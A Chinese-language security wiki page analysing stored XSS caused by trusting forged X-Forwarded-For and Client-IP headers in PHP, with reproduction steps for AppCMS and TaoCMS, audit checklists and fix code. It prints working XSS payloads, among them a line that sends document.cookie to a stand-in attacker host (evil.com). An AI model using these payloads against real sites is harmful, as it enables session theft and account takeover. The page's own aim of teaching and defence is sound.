---
title: HTTP 头伪造导致存储型 XSS 漏洞分析
description: 梳理 X-Forwarded-For、Client-IP 等 HTTP 头伪造导致存储型 XSS 的漏洞原理、利用链构造及修复方案，收录
  AppCMS 与 TaoCMS 两个实战案例
category: program-analysis
tags:
- HTTP头伪造
- X-Forwarded-For
- Client-IP
- 存储型XSS
- AppCMS
- TaoCMS
- 代码审计
- Web安全
date: 2024-01-15
updated: '2026-11-16'
---

## 概述

在 Web 应用开发中，获取客户端真实 IP 地址是常见需求（统计分析、访问控制、日志审计等）。然而，许多开发者未意识到：`X-Forwarded-For`、`Client-IP` 等 HTTP 头字段**完全可由客户端伪造**，若直接将其用于数据库存储、页面回显、日志记录等场景且缺乏过滤，将引发**存储型 XSS**、SQL 注入、代码执行等严重安全问题。

本页面系统梳理该类漏洞的成因、利用链构造、实战案例（AppCMS、TaoCMS）及通用修复方案。

## 漏洞原理

### PHP 中常见的三种获取客户端 IP 方式

| 方式 | 来源 | 可伪造性 | 说明 |
|------|------|----------|------|
| `HTTP_X_FORWARDED_FOR` (XFF) | HTTP 请求头 `X-Forwarded-For` | **高** | 代理/负载均衡传递的原始客户端 IP，格式为 `client, proxy1, proxy2...` |
| `HTTP_CLIENT_IP` | HTTP 请求头 `Client-IP` | **高** | 部分代理服务器发送的头字段 |
| `REMOTE_ADDR` | TCP 连接握手时的源 IP | **低** | 直接建立连接的对端 IP，若经代理则为代理 IP |

### 典型易受攻击的获取代码模式

```php
<?php
function GetIP(){
    if(!empty($_SERVER["HTTP_CLIENT_IP"])){
        $cip = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
        $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif(!empty($_SERVER["REMOTE_ADDR"])){
        $cip = $_SERVER["REMOTE_ADDR"];
    }
    else{
        $cip = "无法获取！";
    }
    return $cip;
}
echo GetIP();
?>
```

**核心缺陷**：优先信任可伪造的 `HTTP_CLIENT_IP` 与 `HTTP_X_FORWARDED_FOR`，且未对获取到的值进行**格式校验**（如 IP 格式正则）、**长度限制**、**输出编码**即直接入库/回显。

### 攻击面延伸

伪造内容落地位置决定危害类型：
- **页面回显**（留言板、评论、日志查看） → **存储型 XSS** [[xd-security-xss-vulnerability-notes-day25-28]] [[catfish-cms-stored-xss-analysis]]
- **SQL 拼接**（IP 入库未参数化） → **SQL 注入**
- **命令拼接**（IP 传入 `exec`/`system`） → **命令执行**
- **文件操作**（IP 作为文件名/路径一部分） → **任意文件写入/读取**

## 实战案例复现

### 案例一：AppCMS 1.3.890 存储型 XSS

#### 漏洞点
网站留言/评论功能，后台查看留言列表时直接回显 `X-Forwarded-For` 头内容，无过滤无转义。

#### 利用链构造
1. 正常提交留言，抓包（Burp Suite）
2. 在 HTTP 头中注入恶意 Payload：
   ```http
   X-Forwarded-For: <script>alert(/xss/)</script>
   ```
   或更隐蔽的事件处理器绕过：
   ```http
   X-Forwarded-For: <img src=x onerror=alert(1)>
   ```
3. 重复提交多次（因应用可能对单条留言长度限制，需分片或多条组合）
4. 管理员登录后台查看留言列表 → Payload 在管理员浏览器执行 → **存储型 XSS 触发**

#### 关键截图回顾
- 抓包修改 `X-Forwarded-For` 头注入 XSS 代码
- 后台留言列表触发弹窗，验证漏洞存在

### 案例二：TaoCMS v2.5Beta5 存储型 XSS

#### 漏洞点
用户评论功能，后台评论管理页面直接回显 `Client-IP` 头内容，无过滤无转义。

#### 利用链构造
1. 进入前台文章评论界面，随意提交评论
2. 抓包，在 HTTP 头注入：
   ```http
   Client-IP: <script>alert(/xxx/)</script>
   ```
3. 提交后，管理员后台查看评论管理 → Payload 执行

#### 关键截图回顾
- 评论提交抓包添加 `Client-IP` 头
- 后台评论列表触发 `alert(/xxx/)`

## 通用利用姿势与变种

| 伪造头 | 典型 Payload 示例 | 绕过思路 |
|--------|-------------------|----------|
| `X-Forwarded-For` | `<svg/onload=alert(1)>` | 标签闭合、事件处理器、编码混淆 |
| `Client-IP` | `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` | Base64 编码、`eval`/`Function` 动态执行 |
| `X-Real-IP` | `"><script>fetch('//evil.com/?c='+document.cookie)</script>` | 引号闭合、外带 Cookie |
| `True-Client-IP` | `<details/open/ontoggle=prompt(1)>` | HTML5 新标签/事件 |

> **注意**：实际攻击中常结合 **XSS 平台**（如 BlueLotus、XSS Receiver）实现盲打、Cookie 窃取、键盘记录、钓鱼登录框等后续利用。[[leanote-markdown-xss-to-electron-rce-case-study]]

## 代码审计检测清单

### 搜索关键字定位入口
```bash
grep -rn "HTTP_X_FORWARDED_FOR\|HTTP_CLIENT_IP\|X-Forwarded-For\|Client-IP" --include="*.php" .
grep -rn "REMOTE_ADDR" --include="*.php" . | grep -v "获取真实IP"
```

### 判断是否存在如下危险模式
- [ ] 直接 `$_SERVER['HTTP_X_FORWARDED_FOR']` 赋值变量且无校验
- [ ] 优先级逻辑：`CLIENT_IP` > `XFF` > `REMOTE_ADDR`（应反向）
- [ ] 变量直接拼入 SQL / 拼入 HTML / 传入 `exec`/`system`/`file_put_contents`
- [ ] 无 `htmlspecialchars()` / `addslashes()` / 参数化查询 / IP 格式正则校验

### 追踪数据流
```
HTTP 头 → GetIP() → $ip → 存入数据库 → 后台列表查询 → 直接 echo $row['ip'] → 浏览器渲染
```

## 修复方案

### 服务端架构层面（推荐）
- **真实 IP 获取应由反向代理/负载均衡器在信任链内完成**，应用层仅读取代理设置的**不可伪造内部头**（如 Nginx `real_ip_header` + `set_real_ip_from` 信任 CIDR 后的 `$remote_addr`）
- 彻底废弃应用层解析 `X-Forwarded-For`/`Client-IP`

### 应用层代码加固（若无法调整架构）

#### 严格 IP 格式校验
```php
function getRealIp(): string {
    // 仅信任 REMOTE_ADDR，或仅在受信代理 IP 段内读取 XFF 首段
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    
    // 若必须支持代理场景，需维护受信代理 IP 白名单
    $trustedProxies = ['10.0.0.0/8', '192.168.0.0/16']; // 示例
    $clientIp = $_SERVER['REMOTE_ADDR'];
    if (in_trusted_proxy($clientIp, $trustedProxies)) {
        $xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
        $first = trim(explode(',', $xff)[0] ?? '');
        if (filter_var($first, FILTER_VALIDATE_IP)) {
            $ip = $first;
        }
    }
    return $ip;
}

function in_trusted_proxy(string $ip, array $cidrs): bool {
    foreach ($cidrs as $cidr) {
        if (ip_in_cidr($ip, $cidr)) return true;
    }
    return false;
}

function ip_in_cidr(string $ip, string $cidr): bool {
    list($subnet, $mask) = explode('/', $cidr);
    return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) === ip2long($subnet);
}
```

#### 入库参数化 + 输出编码
```php
// 入库：预处理语句
$stmt = $pdo->prepare("INSERT INTO comments (content, client_ip) VALUES (?, ?)");
$stmt->execute([$content, getRealIp()]);

// 回显：上下文感知编码
// HTML 上下文
echo htmlspecialchars($row['client_ip'], ENT_QUOTES, 'UTF-8');
// JS 上下文
echo json_encode($row['client_ip'], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
```

#### 统一输入过滤中间件（框架层）
```php
// Laravel / ThinkPHP 中间件示例
public function handle($request, Closure $next) {
    // 强制覆盖伪造头，仅保留真实 REMOTE_ADDR
    $request->server->set('HTTP_X_FORWARDED_FOR', $request->ip());
    $request->server->set('HTTP_CLIENT_IP', $request->ip());
    return $next($request);
}
```

### 安全运营层面
- **WAF 规则**：拦截 `X-Forwarded-For`/`Client-IP` 等头中包含 `<script`、`onerror=`、`javascript:` 等特征的请求
- **日志审计**：记录所有入库的 IP 字段，定期扫描异常长度/特殊字符
- **渗透测试**：将 HTTP 头伪造纳入常规 Web 渗透测试清单 [[xd-security-waf-bypass-techniques-day46-49]]

## 关联知识页面

- [[attack-defense-world-beginner-web-writeup]] — 攻防世界新手区 HTTP 头伪造（XFF/Referer）实战题目
- [[xd-security-xss-vulnerability-notes-day25-28]] — XD安全课程 XSS 专题：原理、HttpOnly 绕过、存储型 XSS 代码审计案例
- [[catfish-cms-stored-xss-analysis]] — Catfish CMS `filterJs` 过滤绕过导致存储型 XSS 代码审计
- [[discuz-x32-stored-dom-xss-bbcode-analysis]] — Discuz X3.2 BBCode 存储型 DOM XSS 深度剖析
- [[leanote-markdown-xss-to-electron-rce-case-study]] — Leanote Markdown 存储型 XSS 到 Electron RCE 完整攻击链
- [[xd-security-waf-bypass-techniques-day46-49]] — WAF 绕过技术体系，含 XSS Payload 变异、编码混淆
- [[ssrf-bypass-techniques]] — SSRF 绕过技巧中亦涉及 `X-Forwarded-For` 头构造与内网探测

## 小结

| 要点 | 说明 |
|------|------|
| **核心成因** | 信任客户端可控 HTTP 头（`X-Forwarded-For`、`Client-IP` 等）且未校验、未编码直接入库/回显 |
| **典型危害** | 存储型 XSS（最常见）、SQL 注入、命令执行、任意文件操作 |
| **根治方案** | 架构层：反向代理终结信任链，应用层仅读取 `$remote_addr`；代码层：白名单校验 + 参数化入库 + 上下文编码输出 |
| **审计重点** | 搜索 `HTTP_X_FORWARDED_FOR`/`HTTP_CLIENT_IP` 赋值点，追踪数据流至 Sink（HTML/JS/SQL/Shell/File） |

> **一句话原则**：**永远不要信任任何来自客户端的 HTTP 头字段**，包括但不限于 `X-Forwarded-For`、`Client-IP`、`X-Real-IP`、`True-Client-IP`、`Referer`、`User-Agent`、`Cookie` 等。所有外部输入均视为污染数据，需经**校验、净化、编码**三重防护方可使用。

## 来源

- [301在路上-201508-202208_095](../sources/301在路上-201508-202208_095.md)
